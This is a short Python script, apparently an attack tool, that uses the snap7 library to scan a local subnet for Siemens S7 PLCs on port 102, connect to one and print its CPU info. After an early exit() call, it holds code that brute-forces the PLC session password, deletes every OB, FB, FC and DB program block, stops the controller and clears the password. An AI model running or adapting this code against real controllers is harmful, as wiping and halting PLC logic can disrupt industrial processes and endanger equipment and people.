import snap7 
import socket

plc = snap7.client.Client()

result=1
oct=200
ip=""
while result!=0:         
    ip="192.168.50."+str(oct)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
         
    # returns an error indicator
    result = s.connect_ex((ip,102))
    if result ==0:
        plc.connect(ip,0,2)
    s.close()
    oct=oct+1
print(ip)
print(plc.get_cpu_info())

exit()





ok=0
pas=0
while ok==0:
    try:         
        plc.set_session_password(str(pas))
        ok=1
    except:
        pas=pas+1
        ok=0
tipos = ['OB','FB','FC','DB']
for tipo in tipos:
    indices_do_tipo = plc.list_blocks_of_type(str(tipo),1000)
    for item in indices_do_tipo:
        plc.delete(tipo,item)
plc.plc_stop()
plc.clear_session_password()


